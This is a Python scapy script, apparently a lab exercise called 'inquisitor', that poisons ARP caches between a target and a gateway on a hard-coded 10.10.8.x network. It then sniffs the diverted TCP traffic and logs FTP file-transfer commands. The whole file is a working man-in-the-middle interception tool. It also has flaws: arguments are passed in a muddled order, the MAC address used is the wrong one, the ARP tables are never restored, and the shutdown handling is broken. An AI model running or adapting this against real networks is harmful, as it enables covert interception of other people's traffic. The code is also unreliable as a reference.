from scapy.all import *
import argparse
import ipaddress
import threading
import time
import logging
import re

stop_event = threading.Event()

log = logging.getLogger("inquisitor")
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# ip_src = "10.10.8.3"
# mac_src = "02:42:0a:0a:08:03"

# ip_target = "10.10.8.2"
# mac_target = "02:42:0a:0a:08:02"

ip_gateway = "10.10.8.4"

def arp_spoof(target_ip, gateway_ip, target_mac):
    arp_packet = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    try:
        send(arp_packet, verbose=False)
    except:
        log.warning("Sending packet not working (probably no permission)")

def threaded_spoofing(ip_server, ip_target, mac_src):
    while not stop_event.is_set():
        arp_spoof(ip_target, ip_server, mac_src)
        arp_spoof(ip_server, ip_target, mac_src)
        time.sleep(1)

def ftp_monitor_callback(packet):
    if packet.haslayer(TCP) and packet[TCP].dport == 21:
        log.warning(f"[{packet.time}] FTP packet captured:")
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors="ignore")
            if "RETR" in payload or "STOR" in payload:
                log.warning(f"{payload}")

def threaded_sniffing():
    try:
        sniff(filter="tcp", prn=ftp_monitor_callback, store=0)
    except:
        log.warning("can't sniff packets (probably no permission)")

def is_valid_mac_address(mac):
    mac_regex = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    res = bool(mac_regex.match(mac))
    if res is False:
        raise Exception("Not a valid mac address")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='This program spoof and can analyze ftp files of a given target')

    parser.add_argument('ip_src')
    parser.add_argument('mac_src')
    parser.add_argument('ip_target')
    parser.add_argument('mac_target')
    
    args = parser.parse_args()

    try:
        ipaddress.IPv4Network(args.ip_src)
        ipaddress.IPv4Network(args.ip_target)
        is_valid_mac_address(args.mac_src)
        is_valid_mac_address(args.mac_target)        
    except:
        print("Not all addresses are valid")
        exit(1)

    print(f"Src_IP : {args.ip_src}, Mac_SRC : {args.mac_src}, Target_IP : {args.ip_target}, Mac_target : {args.mac_target}")

    try:
        spoofing = threading.Thread(target=threaded_spoofing, args=(args.ip_target, ip_gateway, args.mac_src))
        spoofing.start()
        sniffing = threading.Thread(target=threaded_sniffing)
        sniffing.start()
    except KeyboardInterrupt:
        print("Sending kill to all threads")
        stop_event.set()
        spoofing.join()
